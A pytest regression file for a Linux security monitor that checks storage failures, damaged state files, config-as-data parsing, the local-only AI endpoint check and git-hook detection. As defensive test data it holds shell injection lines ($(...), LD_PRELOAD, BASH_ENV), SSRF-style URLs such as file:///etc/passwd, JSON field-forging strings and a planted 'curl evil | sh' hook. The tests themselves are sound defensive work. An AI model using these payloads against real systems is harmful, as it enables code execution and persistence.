"""Regressions found during the 1.0 stabilization pass: failing storage, damaged files of every kind, overlapping runs, and a config file
that must be data rather than code."""
from __future__ import annotations

import errno
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SUITE = ROOT / "LinuxGuardianSuite"
sys.path.insert(0, str(SUITE))

import audit_events  # noqa: E402
import decoys  # noqa: E402
import events  # noqa: E402
import incidents  # noqa: E402
import integrity  # noqa: E402
import notify_events  # noqa: E402
import sensors as sn  # noqa: E402
import timeline  # noqa: E402
from test_sensors import T0, add_proc, at, box, sensor_events, ss_line  # noqa: E402,F401  (box is a fixture)

GARBAGE = {
    "binary.json": b"\x00\xff\xfe\x80 not text at all",
    "empty.json": b"",
    "list.json": b"[1, 2, 3]",
    "string.json": b'"just a string"',
    "truncated.json": b'{"severity": "warning", "message": "cut off here',
    "wrong_types.json": json.dumps({"severity": ["x"], "message": {"a": 1}, "timestamp": 12345}).encode(),
    "no_message.json": json.dumps({"severity": "warning"}).encode(),
    "bad_severity.json": json.dumps({"severity": "apocalyptic", "message": "m"}).encode(),
    "huge.json": json.dumps({"severity": "info", "message": "m" * 3_000_000}).encode(),
    "nul.json": b'{"severity":"info","message":"a\\u0000b"}',
}


# ===================================================================== storage that fails
def make_finding(box: Path) -> None:
    add_proc(box, 5, "/tmp/dropper", ["/tmp/dropper"])
    (box / "ss.out").write_text(ss_line("dropper", 5, "9.9.9.9", 443))


def test_a_full_or_read_only_disk_does_not_crash_the_monitor_and_the_finding_is_not_lost(box, monkeypatch):
    sn.run_once()
    at(monkeypatch, 4 * 86400)
    make_finding(box)
    real = events.record_event

    def failing(*a, **k):
        raise OSError(errno.ENOSPC, "No space left on device")

    monkeypatch.setattr(sn, "record_event", failing)
    r = sn.run_once()                                                       # must not raise
    assert r["recorded"] == 0 and any("the disk is full" in w for w in r["write_errors"])
    monkeypatch.setattr(sn, "record_event", real)
    at(monkeypatch, 4 * 86400 + 600)
    r = sn.run_once()
    assert r["recorded"] >= 1 and r["write_errors"] == []                   # the finding wasn't marked seen, so it is reported once the disk works
    assert {e["event"] for e in sensor_events(box)} >= {"proc_from_tmp"}


def test_an_unwritable_state_file_is_reported_not_raised(box, monkeypatch):
    sn.run_once()
    monkeypatch.setattr(sn, "save_state", lambda s: (_ for _ in ()).throw(OSError(errno.EROFS, "Read-only file system")))
    r = sn.run_once()
    assert any("the disk is read-only" in w and "couldn't save" in w for w in r["write_errors"])


def test_the_command_line_stays_successful_but_tells_you(box, monkeypatch):
    sn.run_once()
    inc = box / "lg" / "incidents"
    inc.mkdir(parents=True, exist_ok=True)
    at(monkeypatch, 4 * 86400)
    make_finding(box)
    inc.chmod(0o500)
    try:
        env = {**os.environ, "LG_SENSOR_NOW": str(T0 + 4 * 86400)}
        r = subprocess.run([sys.executable, str(SUITE / "sensors.py"), "--run"], capture_output=True, text=True, env=env)
    finally:
        inc.chmod(0o700)
    assert r.returncode == 0 and "Traceback" not in r.stderr + r.stdout
    assert "couldn't record" in r.stderr and "permission denied" in r.stderr and "~/.linuxguardian" in r.stderr


def test_two_runs_at_once_do_not_collide(box, monkeypatch):
    """The 5-minute timer and a press of 'Check now' can overlap: the second one steps aside instead of fighting over the state file."""
    import fcntl
    lock_path = sn.state_path().with_name("sensors.lock")
    lock_path.parent.mkdir(parents=True, exist_ok=True)
    fd = os.open(lock_path, os.O_RDWR | os.O_CREAT, 0o600)
    fcntl.flock(fd, fcntl.LOCK_EX)
    try:
        r = sn.run_once()
        assert r["skipped"] == "another run is already in progress" and r["recorded"] == 0 and r["sensors"] == {}
    finally:
        os.close(fd)
    assert "skipped" not in sn.run_once()                                   # the lock is released with the process holding it


def test_temp_files_are_unique_per_process_and_never_left_behind(box):
    sn.save_state({"a": 1})
    sn.save_state({"a": 2})
    assert json.loads(sn.state_path().read_text()) == {"a": 2}
    assert not list(sn.state_path().parent.glob("*.tmp")) and not list(sn.state_path().parent.glob(".*.tmp"))
    assert f".{os.getpid()}." in str(sn.state_path().with_name(f".{sn.state_path().name}.{os.getpid()}.tmp"))


def test_a_failed_write_leaves_the_previous_state_intact(box, monkeypatch):
    sn.save_state({"keep": "me"})
    real_replace = Path.replace
    monkeypatch.setattr(Path, "replace", lambda self, target: (_ for _ in ()).throw(OSError(errno.ENOSPC, "full")))
    with pytest.raises(OSError):
        sn.save_state({"keep": "overwritten"})
    monkeypatch.setattr(Path, "replace", real_replace)
    assert json.loads(sn.state_path().read_text()) == {"keep": "me"} and not list(sn.state_path().parent.glob(".*.tmp"))


# ============================================================ damaged files of every kind
@pytest.fixture()
def junk_folder(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    d = tmp_path / "lg" / "incidents"
    d.mkdir(parents=True)
    now = time.time()
    good = {"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z", time.localtime(now)), "category": "sensor", "severity": "warning", "event": "new_user",
            "message": "A new account appeared: mallory", "entity": ["mallory"]}
    (d / "000-good.json").write_text(json.dumps(good))
    for name, data in GARBAGE.items():
        (d / name).write_bytes(data)
    (d / "isadir.json").mkdir()
    (d / "broken-link.json").symlink_to(tmp_path / "does-not-exist")
    (d / "notjson.txt").write_text("ignored")
    return d


def test_one_damaged_event_file_never_takes_down_the_readers(junk_folder):
    es = events.read_events(junk_folder)
    assert any(e["message"].startswith("A new account") for e in es)
    entries = timeline.load_entries(junk_folder)
    assert any("mallory" in e.message for e in entries)
    obs = incidents.load_observations(days=1, directory=junk_folder)
    assert any("mallory" in o.message for o in obs)
    assert isinstance(incidents.build(days=1, directory=junk_folder), list)


def test_the_command_line_tools_survive_damaged_events(junk_folder, tmp_path):
    env = {**os.environ, "LG_HOME": str(tmp_path / "lg"), "HOME": str(tmp_path)}
    for cmd in ([sys.executable, str(SUITE / "incidents.py"), "--text"], [sys.executable, str(SUITE / "timeline.py"), "--text"],
                [sys.executable, str(SUITE / "timeline.py"), "--json"], [str(SUITE / "notify_events.py"), "--status"]):
        r = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=60)
        assert r.returncode == 0 and "Traceback" not in r.stderr, (cmd, r.stderr[-300:])


def test_notifications_survive_damaged_events(junk_folder, tmp_path, monkeypatch):
    stub = tmp_path / "notify-send"
    stub.write_text("#!/bin/sh\necho \"$*\" >> " + str(tmp_path / "calls") + "\n")
    stub.chmod(0o755)
    monkeypatch.setenv("LG_NOTIFY_CMD", str(stub))
    notify_events.run_send(1.0)
    assert notify_events.run_send(time.time() + 5) == 1                      # the one good warning, and only that
    assert "mallory" in (tmp_path / "calls").read_text()


@pytest.mark.parametrize("loader", [
    lambda: sn.load_state(), lambda: sn.load_allow(), lambda: audit_events.load_previous(), lambda: audit_events.load_accepted(),
    lambda: timeline.load_acks(), lambda: decoys.load_state(), lambda: integrity.read_meta(),
])
@pytest.mark.parametrize("content", [b"\x00\xff\xfe\x80", b"{broken", b"", b"[1,2]", b'"s"', b"null", b"123"])
def test_every_state_loader_shrugs_off_a_damaged_file(tmp_path, monkeypatch, loader, content):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    monkeypatch.setenv("LG_SENSOR_HOME", str(tmp_path / "home"))
    for rel in ("state/sensors.json", "sensors_allow.json", "state/audit.json", "state/accepted_risks.json", "state/timeline_ack.json",
                "state/decoys.json", "baselines/baseline.meta.json"):
        p = tmp_path / "lg" / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(content)
    assert loader() in ({}, None) or isinstance(loader(), (dict, list))        # no exception, and a usable empty-ish value


def test_a_binary_baseline_is_an_error_message_not_a_traceback(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    (tmp_path / "lg" / "baselines").mkdir(parents=True)
    (tmp_path / "lg" / "baselines" / "baseline.sha256").write_bytes(b"\x00\xff\xfe" * 100)
    assert integrity.read_baseline() == {}


# ================================================== the shell side: config as data, JSON that stays valid
def source_config(tmp_path: Path, text: str, mode: int = 0o600) -> subprocess.CompletedProcess:
    home = tmp_path / "home"
    lg = tmp_path / "lg"
    home.mkdir(exist_ok=True)
    lg.mkdir(exist_ok=True)
    lg.chmod(0o700)
    cfg = lg / "config"
    cfg.write_text(text)
    cfg.chmod(mode)
    script = f'source "{SUITE}/config.sh"; echo "honeypot=$LG_HONEYPOT_DIR"; echo "monitored=$LG_MONITORED_DIRS_DEFAULT"; echo "clam=$LG_CLAM_EXCLUDE_DIRS_QUICK"; echo "home=$LG_HOME"'
    return subprocess.run(["bash", "-c", script], capture_output=True, text=True, env={**os.environ, "HOME": str(home), "LG_HOME": str(lg)})


def parse(out: str) -> dict:
    return dict(l.split("=", 1) for l in out.splitlines() if "=" in l)


def test_allowed_settings_are_applied_with_home_expanded(tmp_path):
    r = source_config(tmp_path, 'LG_HONEYPOT_DIR="$HOME/decoy"\nexport LG_MONITORED_DIRS_DEFAULT=~/Work\n# a comment\n\nLG_CLAM_EXCLUDE_DIRS_QUICK=\'^/x|$HOME\'\n')
    got = parse(r.stdout)
    assert got["honeypot"] == f"{tmp_path}/home/decoy" and got["monitored"] == f"{tmp_path}/home/Work"
    assert got["clam"] == "^/x|$HOME"                                          # single quotes: exactly as written


@pytest.mark.parametrize("line", ["$(touch SENTINEL)", "`touch SENTINEL`", "touch SENTINEL", "LG_HONEYPOT_DIR=$(touch SENTINEL)",
                                  "LG_HONEYPOT_DIR=\"`touch SENTINEL`\"", "LG_HONEYPOT_DIR=x; touch SENTINEL", "foo() { touch SENTINEL; }; foo",
                                  "source /dev/null; touch SENTINEL", "PATH=/evil", "LG_HOME=/etc", "LD_PRELOAD=/tmp/x.so", "BASH_ENV=/tmp/x"])
def test_the_config_file_is_data_and_never_runs_code(tmp_path, line):
    marker = tmp_path / "SENTINEL"
    r = source_config(tmp_path, line.replace("SENTINEL", str(marker)) + "\n")
    assert not marker.exists(), f"{line!r} was executed"
    got = parse(r.stdout)
    assert got["home"] == str(tmp_path / "lg")                                # nothing could redirect where LinuxGuardian keeps its data


def test_substitutions_in_values_stay_plain_text(tmp_path):
    marker = tmp_path / "SENTINEL"
    r = source_config(tmp_path, f'LG_HONEYPOT_DIR="$(touch {marker})/x"\n')
    assert not marker.exists() and parse(r.stdout)["honeypot"] == f"$(touch {marker})/x"


def test_unknown_names_and_malformed_lines_are_reported_not_obeyed(tmp_path):
    r = source_config(tmp_path, "EVIL=1\nthis is not a setting\nLG_HOME=/etc\n")
    assert "can't be set here" in r.stderr and "isn't NAME=value" in r.stderr
    assert parse(r.stdout)["home"] == str(tmp_path / "lg")


@pytest.mark.parametrize("mode", [0o666, 0o646, 0o602])
def test_a_config_file_other_users_can_write_is_ignored(tmp_path, mode):
    r = source_config(tmp_path, 'LG_HONEYPOT_DIR="/changed"\n', mode=mode)
    assert "other users can write to it" in r.stderr and parse(r.stdout)["honeypot"] != "/changed"


def test_a_group_writable_file_in_your_own_private_group_is_fine(tmp_path):
    r = source_config(tmp_path, 'LG_HONEYPOT_DIR="/changed"\n', mode=0o660)       # Ubuntu's default umask makes this the common case
    assert parse(r.stdout)["honeypot"] == "/changed" and r.stderr == ""


def test_a_symlinked_config_is_ignored(tmp_path):
    (tmp_path / "home").mkdir()
    lg = tmp_path / "lg"
    lg.mkdir(mode=0o700)
    real = tmp_path / "elsewhere"
    real.write_text('LG_HONEYPOT_DIR="/changed"\n')
    (lg / "config").symlink_to(real)
    r = subprocess.run(["bash", "-c", f'source "{SUITE}/config.sh"; echo "honeypot=$LG_HONEYPOT_DIR"'], capture_output=True, text=True,
                       env={**os.environ, "HOME": str(tmp_path / "home"), "LG_HOME": str(lg)})
    assert "regular file that you own" in r.stderr and parse(r.stdout)["honeypot"] != "/changed"


def test_a_broken_config_never_stops_a_script_from_running(tmp_path):
    (tmp_path / "home").mkdir()
    lg = tmp_path / "lg"
    lg.mkdir(mode=0o700)
    (lg / "config").write_bytes(b"\x00\xff garbage \\\n if [ ; then\n")
    r = subprocess.run([str(SUITE / "linux_cache_cleanup.sh"), "--scan"], capture_output=True, text=True,
                       env={**os.environ, "HOME": str(tmp_path / "home"), "LG_HOME": str(lg)})
    assert r.returncode == 0


NASTY = ['plain message', 'ends with a backslash\\', 'has "quotes" inside', 'a\\"b\\\\"c', 'new\nline\r\nand\ttab', 'bell\x07 and escape\x1b[31m red',
         'unicode ✓ café 日本', '{"injected": "field", "severity": "info"}', '", "severity": "info", "x": "', '\\u0000 literal', 'x' * 20000]


@pytest.mark.parametrize("msg", NASTY)
def test_shell_written_events_are_always_valid_json_and_carry_the_whole_message(tmp_path, msg):
    inc = tmp_path / "inc"
    inc.mkdir()
    script = f'source "{SUITE}/utils.sh"; LG_INCIDENT_DIR="{inc}"; lg_record_incident malware critical "$MSG"'
    subprocess.run(["bash", "-c", script], check=True, env={**os.environ, "MSG": msg, "LG_HOME": str(tmp_path / "lg"), "HOME": str(tmp_path)})
    [f] = inc.glob("*.json")
    d = json.loads(f.read_text())                                          # valid JSON, whatever was in the message
    assert d["category"] == "malware" and d["severity"] == "critical" and set(d) == {"timestamp", "category", "severity", "message"}
    expected = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", msg.replace("\n", " ").replace("\r", " ").replace("\t", " "))
    assert d["message"] == expected                                          # nothing lost but control characters, which JSON can't carry raw


def test_a_message_cannot_forge_other_fields(tmp_path):
    inc = tmp_path / "inc"
    inc.mkdir()
    msg = '", "severity": "info", "category": "audit", "x": "'
    subprocess.run(["bash", "-c", f'source "{SUITE}/utils.sh"; LG_INCIDENT_DIR="{inc}"; lg_record_incident malware critical "$MSG"'], check=True,
                   env={**os.environ, "MSG": msg, "HOME": str(tmp_path)})
    d = json.loads(next(inc.glob("*.json")).read_text())
    assert d["severity"] == "critical" and d["category"] == "malware" and d["message"] == msg


# ====================================== the "local" model must really be local (privacy promise of the investigator)
import ai_investigator as ai  # noqa: E402
import local_ai  # noqa: E402


@pytest.mark.parametrize("url", ["http://127.0.0.1:11434", "http://localhost:11434/", "https://127.0.0.1:9", "http://[::1]:11434", "http://127.1.2.3:80/",
                                 "HTTP://LOCALHOST:11434"])
def test_loopback_http_addresses_are_accepted(url):
    assert ai.local_ollama_url(url) == url.strip().rstrip("/")


@pytest.mark.parametrize("url", ["", "   ", "http://192.168.1.50:11434", "http://10.0.0.5:11434", "http://example.com:11434", "http://localhost.evil.com:11434",
                                 "http://127.0.0.1@evil.example/", "http://evil.example#@127.0.0.1", "file:///etc/passwd", "ftp://127.0.0.1/",
                                 "gopher://127.0.0.1/", "127.0.0.1:11434", "http://0.0.0.0:11434", "http://[2001:db8::1]:11434", "javascript:alert(1)",
                                 "http://", "//127.0.0.1"])
def test_anything_that_is_not_this_laptop_is_refused(url):
    with pytest.raises(ai.AiError, match="on this laptop"):
        ai.local_ollama_url(url)


def test_the_backend_status_and_pull_all_refuse_a_remote_address(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    with pytest.raises(ai.AiError):
        ai.OllamaBackend("qwen2.5:7b", "http://evil.example:11434")
    assert ai.ollama_models("http://evil.example:11434") is None and ai.ollama_models("file:///etc/passwd") is None
    cfg = dict(ai.DEFAULT_CONFIG, backend="ollama", ollama_model="x", ollama_url="http://evil.example:11434")
    ai.save_config(cfg)
    out: list[str] = []
    assert local_ai.pull("qwen2.5:7b", out.append) == 1 and "on this laptop" in out[-1]
    assert ai.status()["problems"] and not ai.status()["configured"]


# ============================== found by the end-to-end tests: lost notifications, quarantine without a daemon, new git hooks
import quarantine as q  # noqa: E402


def test_an_event_in_the_same_second_as_the_previous_run_is_still_announced_once(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    inc = tmp_path / "lg" / "incidents"
    inc.mkdir(parents=True)
    log = tmp_path / "popups"
    s = tmp_path / "notify-send"
    s.write_text(f'#!/bin/sh\necho "$*" >> "{log}"\n')
    s.chmod(0o755)
    monkeypatch.setenv("LG_NOTIFY_CMD", str(s))
    base = int(time.time()) - 100
    notify_events.run_send(base + 0.7)                                       # the previous run: watermark at second 'base', 0.7 into it

    def event(name: str, message: str, ts: int) -> None:
        (inc / f"{name}.json").write_text(json.dumps({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z", time.localtime(ts)), "category": "sensor",
                                                       "severity": "warning", "event": "x", "message": message}))

    event("a", "recorded 0.9 seconds into the same second", base)            # stamped 'base': at or before the watermark
    assert notify_events.run_send(base + 5) == 1                              # used to be lost forever
    assert notify_events.run_send(base + 10) == 0                             # and is not announced again
    event("b", "a later one", base + 11)
    assert notify_events.run_send(base + 20) == 1 and len(log.read_text().splitlines()) == 2


def test_the_announced_memory_stays_small_and_survives_a_damaged_marker(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    (tmp_path / "lg" / "state").mkdir(parents=True)
    (tmp_path / "lg" / "state" / "notify.json").write_bytes(b"\x00\xff{broken")
    assert notify_events.run_send(100.0) == 0                                  # treated as a first run, no crash
    notify_events._write_marker(10_000.0, {f"k{i}": 10_000.0 - i * 100 for i in range(200)})
    kept = json.loads((tmp_path / "lg" / "state" / "notify.json").read_text())["announced"]
    assert len(kept) <= 37 and all(v >= 10_000.0 - 3600 for v in kept.values())


def stub_scanner(bindir: Path, name: str, body: str) -> None:
    bindir.mkdir(exist_ok=True)
    p = bindir / name
    p.write_text("#!/bin/sh\n" + body)
    p.chmod(0o755)


def test_quarantine_verification_works_when_the_daemon_client_is_installed_but_the_daemon_is_not(tmp_path, monkeypatch):
    b = tmp_path / "bin"
    stub_scanner(b, "clamdscan", 'case "$*" in *--ping*) exit 2 ;; esac\necho "ERROR: Could not connect to clamd" >&2\nexit 2')
    stub_scanner(b, "clamscan", 'for last; do :; done\necho "$last: Test.Sig FOUND"\nexit 1')
    monkeypatch.setenv("PATH", f"{b}:/usr/bin:/bin")
    assert q.verify_infected("/home/x/file") == "Test.Sig"                    # used to give up: "ClamAV isn't available"


def test_the_daemon_is_used_when_it_answers_and_the_next_scanner_when_it_errors(tmp_path, monkeypatch):
    b = tmp_path / "bin"
    stub_scanner(b, "clamdscan", 'case "$*" in *--ping*) exit 0 ;; esac\nfor last; do :; done\necho "$last: Daemon.Sig FOUND"\nexit 1')
    stub_scanner(b, "clamscan", 'for last; do :; done\necho "$last: Slow.Sig FOUND"\nexit 1')
    monkeypatch.setenv("PATH", f"{b}:/usr/bin:/bin")
    assert q.verify_infected("/home/x/file") == "Daemon.Sig"
    stub_scanner(b, "clamdscan", 'case "$*" in *--ping*) exit 0 ;; esac\nexit 2')                  # alive at the ping, then fails to scan
    assert q.verify_infected("/home/x/file") == "Slow.Sig"


def test_verification_with_no_working_scanner_is_none_and_a_clean_result_is_empty(tmp_path, monkeypatch):
    b = tmp_path / "bin"
    stub_scanner(b, "clamscan", "exit 2")
    monkeypatch.setenv("PATH", f"{b}:/bin:/usr/bin")
    assert q.verify_infected("/home/x/file") is None
    stub_scanner(b, "clamscan", "exit 0")
    assert q.verify_infected("/home/x/file") == ""
    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
    assert q.verify_infected("/home/x/file") is None


def test_a_brand_new_git_hook_inside_documents_is_a_warning_not_a_routine_new_file(tmp_path, monkeypatch, capsys):
    h = tmp_path / "home"
    proj = h / "Documents" / "proj"
    (proj / ".git" / "hooks").mkdir(parents=True)
    (proj / ".git" / "config").write_text("[core]\n")
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    monkeypatch.setenv("LG_INTEGRITY_HOME", str(h))
    monkeypatch.setenv("LG_INTEGRITY_ROOTS", str(h / "Documents"))
    integrity.do_init()
    (proj / ".git" / "hooks" / "post-checkout").write_text("#!/bin/sh\ncurl evil | sh\n")
    (h / "Documents" / "newdoc.txt").write_text("an ordinary new document")
    capsys.readouterr()
    integrity.do_check()
    out = capsys.readouterr().out
    assert "[WARN] New files in start-up/persistence locations: 1" in out and "post-checkout" in out
    assert "New files in Documents since the baseline: 1" in out and "newdoc.txt" in out
    ev = events.read_events(tmp_path / "lg" / "incidents")
    assert [e["severity"] for e in ev if "post-checkout" in e["message"]] == ["warning"] and not any("newdoc" in e["message"] for e in ev)


def test_a_scan_event_is_not_announced_twice_when_two_runs_share_a_second(tmp_path, monkeypatch):
    monkeypatch.setenv("LG_HOME", str(tmp_path / "lg"))
    inc = tmp_path / "lg" / "incidents"
    inc.mkdir(parents=True)
    log = tmp_path / "popups"
    s = tmp_path / "notify-send"
    s.write_text(f'#!/bin/sh\necho "$*" >> "{log}"\n')
    s.chmod(0o755)
    monkeypatch.setenv("LG_NOTIFY_CMD", str(s))
    t = int(time.time()) - 50
    notify_events.run_send(t + 0.1)
    (inc / "a.json").write_text(json.dumps({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z", time.localtime(t + 1)), "category": "sensor",
                                             "severity": "warning", "message": "once only"}))
    assert notify_events.run_send(t + 1.3) == 1
    assert notify_events.run_send(t + 1.6) == 0 and notify_events.run_send(t + 1.9) == 0       # the boundary second is re-read, never re-announced
    assert len(log.read_text().splitlines()) == 1


def test_a_dead_daemon_is_never_asked_to_scan(tmp_path, monkeypatch):
    b = tmp_path / "bin"
    calls = tmp_path / "calls"
    stub_scanner(b, "clamdscan", f'echo "$*" >> "{calls}"\ncase "$*" in *--ping*) exit 2 ;; esac\nfor last; do :; done\necho "$last: Daemon.Sig FOUND"\nexit 1')
    stub_scanner(b, "clamscan", 'for last; do :; done\necho "$last: Real.Sig FOUND"\nexit 1')
    monkeypatch.setenv("PATH", f"{b}:/usr/bin:/bin")
    assert q.verify_infected("/home/x/file") == "Real.Sig"
    assert all("--ping" in c for c in calls.read_text().splitlines())                          # only ever pinged


@pytest.mark.parametrize("cmd", [["quarantine.py", "--quarantine", ""], ["quarantine.py", "--restore", ""], ["quarantine.py", "--delete", ""],
                                 ["quarantine.py", "--ignore", ""], ["app_manifest.py", "--plan", ""], ["app_manifest.py", "--plan", "   "]])
def test_an_empty_value_is_refused_politely_not_with_a_traceback(tmp_path, cmd):
    r = subprocess.run([sys.executable, str(SUITE / cmd[0]), *cmd[1:]], capture_output=True, text=True,
                       env={**os.environ, "LG_HOME": str(tmp_path / "lg"), "HOME": str(tmp_path)})
    assert r.returncode != 0 and "Traceback" not in r.stderr + r.stdout and r.stderr.strip()
